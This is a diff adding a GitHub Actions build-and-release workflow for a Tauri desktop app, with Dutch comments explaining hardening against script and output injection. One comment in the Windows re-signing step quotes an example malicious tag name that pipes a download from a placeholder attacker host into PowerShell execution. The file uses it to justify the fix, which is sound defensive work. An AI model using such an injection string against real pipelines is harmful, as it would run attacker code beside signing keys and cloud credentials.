@@ -1,0 +1,498 @@
+name: Build and Release
+
+on:
+  push:
+    tags:
+      - 'v*'
+  workflow_dispatch:
+    inputs:
+      version:
+        description: 'Version tag (e.g., v1.0.0)'
+        required: true
+        default: 'v0.1.0'
+
+# Minimale default; elke job hieronder zet zelf op wat hij écht nodig heeft
+# (`contents: write` voor de jobs die de release schrijven). Zonder deze regel
+# erven jobs zonder eigen blok de repo-default.
+permissions:
+  contents: read
+
+# Bevinding O3. Bewust ÉÉN globale groep (niet per tag) en `cancel-in-progress:
+# false`: twee tags kort na elkaar beschrijven allebei dezelfde `latest.json` op
+# de release en zouden elkaars updater-entries overschrijven. Annuleren mag hier
+# al helemaal niet — een halverwege afgebroken release laat een draft met een
+# incomplete assetset achter, en de Windows-leg hangt via `needs` aan de
+# Linux/macOS-leg.
+concurrency:
+  group: release
+  cancel-in-progress: false
+
+jobs:
+  # Release-gate: ci.yml draait de poorten (`npm run verify`), maar triggert
+  # alleen op push/PR naar `main` — een tag matcht geen van beide. Zonder deze
+  # poort wordt een tag die bovenop een commit met
+  # een rode suite staat gewoon gebouwd, gesigneerd, gepubliceerd en via de
+  # auto-updater naar alle bestaande installaties gepusht. De
+  # versievergelijking hieronder vangt bovendien een vergeten `npm run bump`:
+  # als tag en package.json/tauri.conf.json niet synchroon lopen, vergelijkt de
+  # updater gelijke versies en blijft de release voor bestaande installaties
+  # STIL onzichtbaar. Bij verschil faalt deze job expliciet vóór create-release.
+  gate:
+    # 45 zoals de verify-jobs in ci.yml (#229) en de deploy-gate in live.yml: de volledige verify
+    # in één job haalt de 20 min op de GitHub-runner niet meer.
+    timeout-minutes: 45
+    permissions:
+      contents: read
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v5
+        with:
+          # De release-highlightsverifier vergelijkt de huidige tag met de
+          # vorige stabiele tag en heeft daarom tags plus volledige historie nodig.
+          fetch-depth: 0
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v5
+        with:
+          node-version: '22'
+          cache: 'npm'
+
+      - name: Install dependencies (npm ci)
+        run: npm ci
+
+      - name: Install Playwright Chromium
+        run: npx playwright install --with-deps --only-shell chromium
+
+      # Exact dezelfde poort als ci.yml en live.yml — één definitie, in
+      # package.json: typecheck (src én scripts/tests) + de vijf testsuites +
+      # verify:examples + verify:docs.
+      - name: Verify (typecheck, testsuites, examples, docs)
+        run: npm run verify
+
+      # Alleen de release-pipeline heeft gegarandeerd een stabiele tag. De
+      # highlight-cijfers worden hier daarom tegen die tagrange gevalideerd;
+      # gewone ontwikkelverificatie blijft tag-onafhankelijk.
+      - name: Verify visual release highlights
+        run: node scripts/release-highlights.mjs "${GITHUB_REF_NAME#v}"
+
+      - name: Upload Playwright failure artifacts
+        if: failure()
+        uses: actions/upload-artifact@v4
+        with:
+          name: playwright-release-${{ github.job }}-${{ github.run_attempt }}
+          path: |
+            playwright-report/
+            test-results/
+          if-no-files-found: ignore
+          retention-days: 7
+
+      - name: Verify tag matches bumped version
+        env:
+          # De dispatch-input is NIET-VERTROUWDE invoer (vrije tekst, geen
+          # tekenbeperking) en gaat daarom via een env-blok in plaats van een
+          # `${{ }}` rechtstreeks in het shellscript — anders wordt hij letterlijk
+          # in de shell geplakt vóórdat die start. `GITHUB_REF`/`GITHUB_EVENT_NAME`
+          # zetten we bewust NIET: die zijn al standaard aanwezig in de runner en
+          # de `GITHUB_`-prefix is gereserveerd.
+          INPUT_VERSION: ${{ github.event.inputs.version }}
+        run: |
+          set -euo pipefail
+          if [ "$GITHUB_EVENT_NAME" = "workflow_dispatch" ]; then
+            TAG_VERSION="${INPUT_VERSION:-}"
+          else
+            TAG_VERSION="${GITHUB_REF#refs/tags/}"
+          fi
+          # Strip de leidende 'v' (v2026.7.12 -> 2026.7.12).
+          TAG_VERSION="${TAG_VERSION#v}"
+          PKG_VERSION="$(node -p "require('./package.json').version")"
+          TAURI_VERSION="$(node -p "require('./src-tauri/tauri.conf.json').version")"
+          echo "Tag (zonder v):     $TAG_VERSION"
+          echo "package.json:       $PKG_VERSION"
+          echo "tauri.conf.json:    $TAURI_VERSION"
+          if [ "$TAG_VERSION" != "$PKG_VERSION" ] || [ "$TAG_VERSION" != "$TAURI_VERSION" ]; then
+            echo "::error::Versie kloppendheid mislukt: tag=$TAG_VERSION package.json=$PKG_VERSION tauri.conf.json=$TAURI_VERSION — draai 'npm run bump <versie>' voor je tagt." >&2
+            exit 1
+          fi
+
+      # Vroege signalering: ontbreekt docs/release-notes/<tag>.md, dan valt de
+      # release terug op de generieke tekst en blijft het updater-notes-veld
+      # leeg. Bewust een warning en géén fout — de terugval werkt — maar je wilt
+      # het weten vóór een build van een half uur, niet erna.
+      - name: Check release notes present
+        env:
+          INPUT_VERSION: ${{ github.event.inputs.version }}
+        run: |
+          set -euo pipefail
+          if [ "$GITHUB_EVENT_NAME" = "workflow_dispatch" ]; then
+            TAG_VERSION="${INPUT_VERSION:-}"
+          else
+            TAG_VERSION="${GITHUB_REF#refs/tags/}"
+          fi
+          # stderr (waar de ::warning:: op staat) naar de log, stdout weg.
+          node scripts/release-notes.mjs "$TAG_VERSION" --format=body 2>&1 >/dev/null
+
+  create-release:
+    needs: gate
+    timeout-minutes: 10
+    permissions:
+      contents: write
+    runs-on: ubuntu-latest
+    outputs:
+      release_id: ${{ steps.create-release.outputs.result }}
+      version: ${{ steps.get-version.outputs.version }}
+
+    steps:
+      - uses: actions/checkout@v5
+
+      - name: Get version
+        id: get-version
+        env:
+          # Bevinding O1. Een tagnaam en een dispatch-input zijn vrije tekst;
+          # een `${{ }}` daarvan wordt LETTERLIJK in het script geplakt vóór de
+          # shell start, dus `v1.0$(...)` voert uit. Alles gaat via env.
+          # `GITHUB_EVENT_NAME`/`GITHUB_REF` zetten we hier bewust NIET: die zijn
+          # al aanwezig in de runner en de `GITHUB_`-prefix is gereserveerd.
+          INPUT_VERSION: ${{ github.event.inputs.version }}
+        run: |
+          set -euo pipefail
+          if [ "$GITHUB_EVENT_NAME" = "workflow_dispatch" ]; then
+            VERSION="${INPUT_VERSION:-}"
+          else
+            VERSION="${GITHUB_REF#refs/tags/}"
+          fi
+          # Whitelist die de hele injectieklasse sluit: deze waarde stroomt door
+          # naar een github-script-stap én naar het pwsh-script in de job met de
+          # signing-secrets. Twee controles, en ze zijn allebei nodig:
+          #
+          #  1. Tekenset op de HELE waarde. `case` matcht altijd de volledige
+          #     string, dus dit sluit ook een NIEUWE REGEL uit. Zonder deze stap
+          #     glipt "v1.2.3\nv9.9.9" door de regex hieronder (grep matcht per
+          #     regel) en schrijft de dispatch-input daarna een tweede regel in
+          #     $GITHUB_OUTPUT — een output-injectie. Een git-tag kan geen
+          #     nieuwe regel bevatten, een dispatch-input wél.
+          #  2. Structuur. Na stap 1 bestaat de waarde uitsluitend uit 'v',
+          #     cijfers en punten op één regel, dus is de regex sluitend.
+          #
+          # Na deze poort bevat $VERSION gegarandeerd geen teken dat in een
+          # shell, in pwsh of in JS iets betekent. (Dat het óók echte CalVer is,
+          # bewaakt de gate hierboven via de vergelijking met package.json.)
+          case "$VERSION" in
+            *[!v0-9.]*|'')
+              echo "::error::Versie bevat tekens buiten 'v', cijfers en punten (of is leeg)." >&2
+              exit 1
+              ;;
+          esac
+          if ! printf '%s' "$VERSION" | grep -qE '^v[0-9]+\.[0-9]+\.[0-9]+$'; then
+            echo "::error::Versie '$VERSION' heeft niet de vorm vX.Y.Z." >&2
+            exit 1
+          fi
+          echo "version=$VERSION" >> "$GITHUB_OUTPUT"
+
+      # De releasetekst komt uit `docs/release-notes/<tag>.md` via
+      # scripts/release-notes.mjs; ontbreekt dat bestand, dan levert het script
+      # de generieke tekst die hier vroeger hardgecodeerd stond (en logt een
+      # warning). De versie gaat via `env` de stap in en NIET via een `${{ }}`
+      # in het script zelf: bij workflow_dispatch is dat vrije, niet-vertrouwde
+      # tekst die anders letterlijk in de JS-broncode geplakt wordt.
+      - name: Create release
+        id: create-release
+        uses: actions/github-script@v8
+        env:
+          # Bevinding O1: `'${{ ... }}'` in een script-blok breekt al op een
+          # enkele quote en plakt daarna vrije tekst als JS-broncode. Via env +
+          # process.env — hetzelfde patroon als publish-release hieronder.
+          # (`execFileSync` met een argumentenlijst is om dezelfde reden geen
+          # shell-aanroep: de versie gaat als argv-element naar node, niet door
+          # een shell heen.)
+          VERSION: ${{ steps.get-version.outputs.version }}
+        with:
+          script: |
+            const { execFileSync } = require('node:child_process');
+            const version = process.env.VERSION;
+            const body = execFileSync(
+              'node',
+              ['scripts/release-notes.mjs', version, '--format=body'],
+              { encoding: 'utf8', stdio: ['ignore', 'pipe', 'inherit'] }
+            );
+            const { data } = await github.rest.repos.createRelease({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              tag_name: version,
+              name: `Open Planner Studio ${version}`,
+              body,
+              draft: true,
+              prerelease: false
+            });
+            return data.id;
+
+  build-linux-mac:
+    needs: create-release
+    timeout-minutes: 45
+    permissions:
+      contents: write
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          - platform: 'ubuntu-22.04'
+            args: ''
+          - platform: 'macos-latest'
+            args: '--target universal-apple-darwin'
+
+    runs-on: ${{ matrix.platform }}
+    env:
+      TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}
+      TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}
+
+    steps:
+      - uses: actions/checkout@v5
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v5
+        with:
+          node-version: 22
+          cache: 'npm'
+
+      - name: Install Rust stable
+        uses: dtolnay/rust-toolchain@stable
+
+      - name: Install Rust targets (macOS universal)
+        if: matrix.platform == 'macos-latest'
+        run: rustup target add aarch64-apple-darwin x86_64-apple-darwin
+
+      - name: Install dependencies (Ubuntu only)
+        if: matrix.platform == 'ubuntu-22.04'
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y libwebkit2gtk-4.1-dev libappindicator3-dev librsvg2-dev patchelf
+
+      # Bevinding O2: `npm ci` installeert exact wat de lockfile vastlegt en
+      # controleert de integriteitshashes — zonder dit was een gesigneerde
+      # installer niet reproduceerbaar. Er staat hier bewust GEEN rust-cache
+      # (zie ci.yml): een release bouwt uit een schone target-map.
+      - name: Install frontend dependencies (npm ci)
+        run: npm ci
+
+      - name: Build Tauri app
+        uses: tauri-apps/tauri-action@action-v0.6.1
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        with:
+          args: ${{ matrix.args }}
+          releaseId: ${{ needs.create-release.outputs.release_id }}
+          includeUpdaterJson: true
+
+  build-windows:
+    needs: [create-release, build-linux-mac]
+    timeout-minutes: 45
+    permissions:
+      contents: write
+    runs-on: windows-latest
+    env:
+      TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}
+      TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}
+
+    steps:
+      - uses: actions/checkout@v5
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v5
+        with:
+          node-version: 22
+          cache: 'npm'
+
+      - name: Install Rust stable
+        uses: dtolnay/rust-toolchain@stable
+
+      # Bevinding O2 — zie de toelichting in build-linux-mac.
+      - name: Install frontend dependencies (npm ci)
+        run: npm ci
+
+      - name: Build Tauri app
+        uses: tauri-apps/tauri-action@action-v0.6.1
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        with:
+          releaseId: ${{ needs.create-release.outputs.release_id }}
+          # latest.json wordt uitsluitend door de re-sign-stap hieronder beheerd
+          # (na Authenticode); voorkomt dat deze run de linux/macos-entries raakt.
+          includeUpdaterJson: false
+
+      - name: Sign Windows executables
+        uses: azure/trusted-signing-action@v0.5.0
+        with:
+          azure-tenant-id: ${{ secrets.AZURE_TENANT_ID }}
+          azure-client-id: ${{ secrets.AZURE_CLIENT_ID }}
+          azure-client-secret: ${{ secrets.AZURE_CLIENT_SECRET }}
+          endpoint: ${{ secrets.AZURE_ENDPOINT }}
+          trusted-signing-account-name: ${{ secrets.AZURE_TRUSTED_SIGNING_ACCOUNT_NAME }}
+          certificate-profile-name: ${{ secrets.AZURE_CERTIFICATE_PROFILE_NAME }}
+          files-folder: ${{ github.workspace }}/src-tauri/target/release/bundle/nsis
+          files-folder-filter: exe
+          files-folder-depth: 1
+          file-digest: SHA256
+          timestamp-rfc3161: http://timestamp.acs.microsoft.com
+          timestamp-digest: SHA256
+
+      - name: Re-sign updater artifacts after Authenticode signing
+        shell: pwsh
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          # Bevinding O1, en dit was de scherpste van de zes: pwsh evalueert
+          # `$(...)` BINNEN een double-quoted string, dus een tagnaam
+          # `v1.0$(curl attacker/x|iex)` voerde uit in precies de job die de
+          # Tauri-signing-sleutel en alle Azure-credentials in zijn env heeft.
+          # Via env leest pwsh de waarde als data, niet als broncode. De
+          # CalVer-whitelist in create-release sluit de klasse aan de bron.
+          VERSION: ${{ needs.create-release.outputs.version }}
+          REPO: ${{ github.repository }}
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $VERSION = $env:VERSION
+          $REPO = $env:REPO
+          $NSIS_DIR = "$env:GITHUB_WORKSPACE/src-tauri/target/release/bundle/nsis"
+
+          # --- Diagnostics: dump the nsis bundle dir so a future failure shows
+          # exactly what Tauri produced (the v2026.6.0 build had NO .nsis.zip here,
+          # which is why the old `Get-ChildItem *.nsis.zip` returned $null and
+          # `Remove-Item $ZIP.FullName` crashed on a null Path argument).
+          Write-Host "=== Contents of $NSIS_DIR ==="
+          Get-ChildItem $NSIS_DIR | Select-Object Name | Format-Table -AutoSize | Out-String | Write-Host
+
+          # --- Find the Authenticode-signed installer. This MUST exist; the zip
+          # does not have to.
+          $EXE = Get-ChildItem "$NSIS_DIR/*-setup.exe" | Select-Object -First 1
+          if ($null -eq $EXE) {
+            throw "No *-setup.exe found in $NSIS_DIR — cannot build the updater artifact."
+          }
+          Write-Host "Signed exe: $($EXE.Name)"
+
+          # --- Derive the zip name FROM THE EXE instead of searching for it, so we
+          # never depend on a pre-existing .nsis.zip. (e.g. "...x64-setup.exe" ->
+          # "...x64-setup.nsis.zip".)
+          $ZIP_NAME = $EXE.Name -replace '\.exe$', '.nsis.zip'
+          $ZIP_PATH = Join-Path $NSIS_DIR $ZIP_NAME
+          if (Test-Path $ZIP_PATH) {
+            Remove-Item $ZIP_PATH -Force
+          }
+          Write-Host "Zip name: $ZIP_NAME"
+
+          # --- Build the .nsis.zip around the signed exe. Use the ZipFile API with
+          # CompressionLevel.Optimal (Deflate): Compress-Archive can emit Deflate64,
+          # which Tauri's updater cannot decompress. Entry name MUST be the exe's
+          # bare filename — that's what the updater extracts and runs.
+          Add-Type -AssemblyName System.IO.Compression.FileSystem
+          $archive = [System.IO.Compression.ZipFile]::Open($ZIP_PATH, 'Create')
+          [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($archive, $EXE.FullName, $EXE.Name, [System.IO.Compression.CompressionLevel]::Optimal)
+          $archive.Dispose()
+          Write-Host "Built zip: $ZIP_PATH"
+
+          # --- Generate the updater signature for the rebuilt zip.
+          # tauri signer sign writes a .sig file next to the input file.
+          npx tauri signer sign "$ZIP_PATH" --private-key "$env:TAURI_SIGNING_PRIVATE_KEY" --password "$env:TAURI_SIGNING_PRIVATE_KEY_PASSWORD"
+
+          # Read the freshly generated .sig file (the updater `signature` field is
+          # the *contents* of the .sig, not a path or URL).
+          $ZIP_SIG = (Get-Content "$ZIP_PATH.sig" -Raw).Trim()
+          Write-Host "New zip signature: $($ZIP_SIG.Substring(0, [Math]::Min(50, $ZIP_SIG.Length)))..."
+
+          # --- Upload the rebuilt updater artifacts plus the signed installer.
+          # (The signed setup.exe is uploaded for humans who download directly.)
+          gh release upload $VERSION "$ZIP_PATH" "$ZIP_PATH.sig" "$($EXE.FullName)" --clobber --repo "$REPO"
+
+          # --- Resolve the asset NAME via the API. GitHub rewrites spaces in
+          # asset names to dots (e.g. "Open Planner Studio_..." -> "Open.Planner.Studio_..."),
+          # so hand-building the name from $ZIP_NAME could mismatch.
+          # KRITIEK: gebruik NIET $zipAsset.url — de release is op dit punt nog een
+          # DRAFT en de API geeft dan een tijdelijke `releases/download/untagged-…`-
+          # URL terug die na publicatie 404't (dit brak Windows-auto-update in
+          # v2026.7.1). Bouw daarom zelf de stabiele `releases/latest/download/`-URL,
+          # consistent met de linux/macos-entries die tauri-action schrijft.
+          $assets = (gh release view $VERSION --repo "$REPO" --json assets | ConvertFrom-Json).assets
+          $zipAsset = $assets | Where-Object { $_.name -like '*.nsis.zip' } | Select-Object -First 1
+          $ZIP_ASSET_NAME = $zipAsset.name
+          if ([string]::IsNullOrEmpty($ZIP_ASSET_NAME)) {
+            # Fallback: mimic GitHub's space->dot rewrite manually if the API lookup
+            # somehow came back empty.
+            $ZIP_ASSET_NAME = $ZIP_NAME -replace ' ', '.'
+            Write-Host "API lookup empty — using space->dot rewrite of the local zip name"
+          }
+          $ZIP_URL = "https://github.com/$REPO/releases/latest/download/$ZIP_ASSET_NAME"
+          Write-Host "Zip URL: $ZIP_URL"
+
+          # --- Patch latest.json. build-linux-mac already uploaded one with the
+          # linux + macos entries; build-windows's own tauri-action run also merged
+          # a latest.json, but its Windows signatures predate the Authenticode
+          # re-signing and are stale. We SET both Windows keys authoritatively here.
+          gh release download $VERSION --pattern "latest.json" --output latest.json --clobber --repo "$REPO"
+
+          $latest = Get-Content latest.json -Raw | ConvertFrom-Json
+          if ($null -eq $latest.platforms) {
+            $latest | Add-Member -NotePropertyName platforms -NotePropertyValue ([pscustomobject]@{}) -Force
+          }
+
+          # Tauri's runtime resolves "windows-x86_64-nsis" first and falls back to
+          # "windows-x86_64", so both must carry the zip. Linux/macOS untouched.
+          $winEntry = [pscustomobject]@{ signature = $ZIP_SIG; url = $ZIP_URL }
+          foreach ($key in @('windows-x86_64', 'windows-x86_64-nsis')) {
+            $latest.platforms | Add-Member -NotePropertyName $key -NotePropertyValue $winEntry -Force
+            Write-Host "Set $key -> $ZIP_URL (zip signature)"
+          }
+
+          $latest | ConvertTo-Json -Depth 10 | Set-Content latest.json -NoNewline
+          gh release upload $VERSION latest.json --clobber --repo "$REPO"
+
+          Write-Host "Windows updater entries set to the .nsis.zip with matching signature"
+
+  publish-release:
+    timeout-minutes: 10
+    permissions:
+      contents: write
+    runs-on: ubuntu-latest
+    needs: [create-release, build-linux-mac, build-windows]
+
+    steps:
+      - uses: actions/checkout@v5
+
+      # Het `notes`-veld in latest.json is wat de updater-dialoog toont op het
+      # moment dat de update wordt aangeboden. tauri-action laat het leeg, dus
+      # zetten we het hier — als laatste stap vóór publicatie, zodat het niet
+      # botst met de Windows-re-sign-stap die latest.json óók herschrijft.
+      - name: Set updater notes in latest.json
+        # Bewust niet-blokkerend: de notes zijn cosmetisch, de publicatie niet.
+        # Een release met 15 assets die als draft blijft hangen omdat een
+        # tekstveld niet gezet kon worden, is erger dan een lege notes-tekst.
+        # De stap kleurt wel rood in de UI, dus stil gaat het niet.
+        continue-on-error: true
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          VERSION: ${{ needs.create-release.outputs.version }}
+          REPO: ${{ github.repository }}
+        run: |
+          set -euo pipefail
+          node scripts/release-notes.mjs "$VERSION" --format=notes > release-notes.txt
+          gh release download "$VERSION" --pattern "latest.json" --output latest.json --clobber --repo "$REPO"
+          node -e '
+            const fs = require("node:fs");
+            const latest = JSON.parse(fs.readFileSync("latest.json", "utf8"));
+            latest.notes = fs.readFileSync("release-notes.txt", "utf8");
+            fs.writeFileSync("latest.json", JSON.stringify(latest, null, 2));
+            console.log(`notes: ${latest.notes.length} tekens, ${Object.keys(latest.platforms ?? {}).length} platform-entries`);
+          '
+          gh release upload "$VERSION" latest.json --clobber --repo "$REPO"
+
+      - name: Publish release
+        id: publish-release
+        uses: actions/github-script@v8
+        env:
+          release_id: ${{ needs.create-release.outputs.release_id }}
+        with:
+          script: |
+            github.rest.repos.updateRelease({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              release_id: process.env.release_id,
+              draft: false,
+              prerelease: false
+            });
